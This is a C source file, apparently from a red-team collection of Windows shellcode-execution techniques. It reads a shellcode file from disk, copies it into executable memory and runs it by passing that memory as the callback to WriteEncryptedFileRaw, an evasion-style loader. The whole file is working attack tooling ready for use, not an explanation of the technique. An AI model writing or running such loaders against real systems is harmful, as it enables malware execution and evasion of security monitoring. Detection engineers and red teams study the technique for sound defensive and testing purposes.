// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>

#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HANDLE hFile = NULL;
	PVOID pContext = NULL;
	DWORD written = 0;

	if (argc != 2)
	{
		printf("Usage: WriteEncryptedFileRaw.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	hFile = CreateFile(L"C:\\Windows\\Temp\\Blank.txt", GENERIC_WRITE,
		0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
		goto CLEANUP;

	char c[] = { 'W','R','A','7','H'};
	WriteFile(hFile, c, sizeof(c), &written, NULL);

	//CloseHandle for EncryptedFileRaw to work
	CloseHandle(hFile);

	OpenEncryptedFileRaw(L"C:\\Windows\\Temp\\Blank.txt", CREATE_FOR_IMPORT, &pContext);
	
	WriteEncryptedFileRaw((PFE_IMPORT_FUNC)hAlloc, NULL, pContext);
	
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (pContext)
		CloseEncryptedFileRaw(pContext);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}